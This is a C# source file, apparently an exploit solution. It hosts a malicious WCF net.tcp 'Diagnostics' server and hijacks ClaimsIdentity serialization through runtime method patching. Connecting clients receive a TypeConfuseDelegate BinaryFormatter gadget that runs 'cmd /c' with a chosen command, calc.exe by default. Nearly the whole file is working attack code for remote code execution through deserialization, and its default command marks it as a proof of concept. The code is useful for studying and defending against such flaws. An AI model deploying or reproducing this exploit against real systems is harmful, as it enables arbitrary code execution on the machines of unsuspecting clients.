using RemoteDiagnostics.Contract;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security.Claims;
using System.ServiceModel;

namespace Solution.Server
{
    internal class Program
    {
        private static string command = "calc.exe";

        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibrary(string dllToLoad);

        static void CompilationCheck()
        {
            if (IntPtr.Size == 4)
            {
                throw new Exception("Must be compiled for 64 bit");
            }
#if DEBUG
            throw new Exception("Must be compiled for release");
#endif
        }

        static void Main(string[] args)
        {
            command = Environment.GetEnvironmentVariable("CMD") ?? "calc.exe";
            string port = Environment.GetEnvironmentVariable("PORT") ?? "2024";

            CompilationCheck();

            IntPtr res = LoadLibrary("Solution.AcceptAnyCreds.dll");
            if (res == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to load AcceptAnyCreds library (check both targets 64-bit and that Solution.AcceptAnyCreds.dll is in current directory): {0}", Marshal.GetLastWin32Error());
                return;
            }

            HijackSerializationMethod();

            string uri = string.Format("net.tcp://localhost:{0}", port);
            Console.WriteLine("[*] Listening on: {0}", uri);
            Console.WriteLine("[*] Running with command: {0}", command);

            DiagnosticsBinding binding = new DiagnosticsBinding();
            Uri netTcpUri = new Uri(uri);

            ServiceHost myServiceHost = new ServiceHost(typeof(DiagnosticsService), netTcpUri);
            myServiceHost.AddServiceEndpoint(typeof(IDiagnostics), binding, "Diagnostics");

            myServiceHost.Open();
            Console.WriteLine("[*] Listening...");
            Console.ReadLine();
        }

        string SerializeClaimsHijack()
        {
            Console.WriteLine("[*] Serializing gadget...");

            object gadget = TypeConfuseDelegateGadget(command);
            string ret = null;
            using (MemoryStream memoryStream = new MemoryStream())
            {
                new BinaryFormatter().Serialize(memoryStream, gadget);
                ret = Convert.ToBase64String(memoryStream.GetBuffer(), 0, (int)memoryStream.Length);
            }

            return ret;
        }

        // https://www.infoq.com/articles/overriding-sealed-methods-c-sharp/
        public static void HijackSerializationMethod()
        {
            var source = typeof(ClaimsIdentity).GetMethod("SerializeClaims", BindingFlags.NonPublic | BindingFlags.Instance);
            var target = typeof(Program).GetMethod("SerializeClaimsHijack", BindingFlags.NonPublic | BindingFlags.Instance);

            Console.WriteLine("[*] Hijacking {0} -> {1}", source, target);

            RuntimeHelpers.PrepareMethod(source.MethodHandle);
            RuntimeHelpers.PrepareMethod(target.MethodHandle);

            var sourceMethodDescriptorAddress = source.MethodHandle.Value;
            var targetMethodMachineCodeAddress = target.MethodHandle.GetFunctionPointer();

            Marshal.WriteIntPtr(sourceMethodDescriptorAddress, 1 * IntPtr.Size, targetMethodMachineCodeAddress);
        }

        // https://muffsec.com/blog/finding-a-new-datacontractserializer-rce-gadget-chain/
        public static object TypeConfuseDelegateGadget(string cmd)
        {
            Delegate da = new Comparison<string>(string.Compare);
            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
            IComparer<string> comp = Comparer<string>.Create(d);
            SortedSet<string> set = new SortedSet<string>(comp);
            set.Add("cmd");
            set.Add("/c " + cmd);

            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = d.GetInvocationList();
            invoke_list[1] = new Func<string, string, Process>(Process.Start);
            fi.SetValue(d, invoke_list);

            return set;
        }
    }
}
